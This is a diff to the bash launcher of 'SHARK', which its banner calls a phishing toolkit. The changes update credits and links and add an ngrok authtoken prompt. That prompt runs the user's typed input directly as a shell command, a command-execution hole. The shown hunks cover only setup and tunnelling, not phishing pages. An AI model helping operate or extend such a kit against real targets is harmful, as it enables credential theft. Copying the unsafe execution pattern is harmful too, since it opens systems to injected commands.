@@ -3,9 +3,11 @@
 ##############################################
 #                                            #
 #             PROJECT: SHARK                 #
-#              SHARK ©2022                   #
-#           BEST PHISHING TOOLS              #
-#       Author : Ashish Singh                #
+#              SHARK ©2022-2023              #
+#           BEST PHISHING TOOLS BY           #
+#             M r. D e r e K   (Contributor) #
+#          B h a v i k   O z a (Publisher)   #  
+#         A s h i s h  S i n g h (Author)    #
 ##############################################
 
 #########
@@ -213,7 +215,7 @@ Options:
   --fix-cloudfl     Fix CloudFlared port forwarding issue
   --fix-patches     Check missing packages & fix patches
   --fix-cloudshell  Restart Vm and cloudshell & fix patches
-For additional info, see: https://github.com/Bhaviktutorials/shark/tree/Beta
+For additional info, see: https://github.com/Bhaviktutorials/shark
 EOF
 }
 
@@ -595,10 +597,33 @@ ${red}[D]$cafe :${green} localhost $cafe\e[0;33m[\e[0;34mFor Devs!\e[0;33m]
 \n\n"
 read -p $'\e[1;32m\e[94m Please enter your Option (A/B/D) : ' portfrd
 if [[ $portfrd == "A" || $portfrd == "a" || $portfrd == "ngrok" ]]; then
-	p="S"
+	p="S" 
 	if [ -e ${BIN}/ngrok ];then
 		echo
-	        msg " ngrok is already installed."
+                   msg "ngrok is already installed."
+               if [[ ! -e $HOME/.ngrok2 ]]; then
+		     echo ""
+		      read -p $'\e[1;33m Please Enter Your ngrok authtoken without "./"\n\n\e[0m./' auth
+		 
+                           if [[ -z $auth  ]]; then
+			    
+			      echo ""
+			      error_msg "it seems quit empty try again!"
+			      sleep 4
+			      prt
+		           else 
+			      $auth 
+			      clear  
+			      msg "Authtoken Verified."
+			      sleep 2
+			      prt
+		           fi
+                    
+	 else
+		     echo ""
+		      msg "Authtoken Verified."
+		      sleep 3
+	 fi
 	        sleep 1
 		if [[ $valu != "19" ]]; then
 			if [[ $reddc == "TRUE" ]];then
@@ -616,6 +641,7 @@ if [[ $portfrd == "A" || $portfrd == "a" || $portfrd == "ngrok" ]]; then
 		echo
 		error_msg " ngrok is not install yet!"
 		sleep 2
+                echo ""
 		msg "Preparing fix's ...\n"
 		sleep 5
 		fix_ngrok
@@ -875,7 +901,7 @@ if [[ ! -e "${logfile}.sharkmsg" ]]; then
 Developers assume NO liability and are NOT responsible for any damage caused by this program.
 Also we want to inform you that some of your actions may be ILLEGAL and you CAN NOT use this
 software to test device, company or any other type of target without WRITTEN PERMISSION from them.\n\n"
-msg "Give us your feedback on :- https://chat.whatsapp.com/DY8itwxRnuf64yqxoWZ0SQn\n"
+msg "Give us your feedback on telegram chat grp:- https://t.me/bhaviktutorial\n"
 
 read -p $'\e[1;40m\e[1;92m T O  R U N  S H A R K  A C C E P T  D I S C L A I M E R\e[1;93m (Y/N) : \e[0m' shmsg
 
